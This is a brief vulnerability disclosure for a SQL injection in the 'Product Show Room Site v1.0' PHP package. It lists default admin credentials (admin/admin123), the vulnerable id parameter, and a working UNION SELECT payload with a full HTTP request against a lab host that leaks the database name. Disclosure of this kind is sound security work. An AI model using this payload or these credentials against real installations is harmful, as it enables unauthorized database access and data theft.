# Product Show Room Site v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15370/product-show-room-site-phpoop-free-source-code.html

Vulnerability File: /psrs/admin/?page=user/manage_user&id=

Vulnerability location: /psrs/admin/?page=user/manage_user&id=, id

Current database name: hsrs_db ,length is 7

[+] Payload: /psrs/admin/?page=user/manage_user&id=-7%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11--+ // Leak place ---> id

```sql
GET /psrs/admin/?page=user/manage_user&id=-7%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/171826900-68d58736-8d48-499e-807e-bea9cd641cc7.png)

![image](https://user-images.githubusercontent.com/54017627/171827106-ef6d8840-ed6b-4788-a0a8-d5913e902168.png)
